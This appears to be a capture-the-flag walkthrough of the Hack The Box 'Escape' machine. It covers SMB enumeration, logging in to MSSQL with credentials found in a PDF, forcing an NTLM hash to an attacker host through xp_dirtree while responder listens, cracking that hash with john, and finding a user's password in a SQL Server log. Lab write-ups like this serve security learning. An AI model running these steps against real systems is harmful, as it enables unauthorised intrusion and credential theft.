---
title: HTB Escape
date: 2023-03-16 02:47:00 -0500
categories: [Walkthrough, Hackthebox]
tags: [HTB, Hackthebox]
published: true
---

## Enumeration

Running `nmap -sC -sV -O -T5 sequel.htb -vvvv -oN nmap_inital` shows us the target we have is a windows runing kerberos and has the typical ports such as RPC and SMB.

### SMB 

```bash
smbclient -L sequel.htb -U "" --password ""

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
```

We're allowed anonymous access we can check the public drive `smbclient \\\\sequel.htb\\Public -U "" --password ""`. `dir` shows us a pdf, we can get that with `get "SQL Server Procedures.pdf"`.

![SQL Server Procedures](/assets/escape01.png)

## MSSQL Server - 1433

```bash
sqsh -S sequel.htb -U PublicUser -P GuestUserCantWrite1
```

We can connect with sqsh, then setup responder to capture the NTLM hash.

### Steal NetNTLM hash / Relay attack

setup responder on our attacker machine `sudo responder -I tun0`

in the sqsh cmd `xp_dirtree '\\attacker_ip\0xskar'`

and we get back a response with the hash:

![responder hash](/assets/escape02.png)

## Hash Cracking

Save the NTLM hash and feed it to john with rockyou.txt

![Feed to john](/assets/escape03.png)

## Privilege Escalation - User.txt

So with the credentials we can create a connection with evil-winrm.

Browsing around the machine we are not allowed to look at much but there is a log file in the SQLServer logs that has an entry for Ryan.Cooper who was looking at their keyboard while loggin in apparently.

`type ERRORLOG.bak`

![creds in logs file](/assets/escape04.png)

We can login to Ryan's account and pickup the user flag.
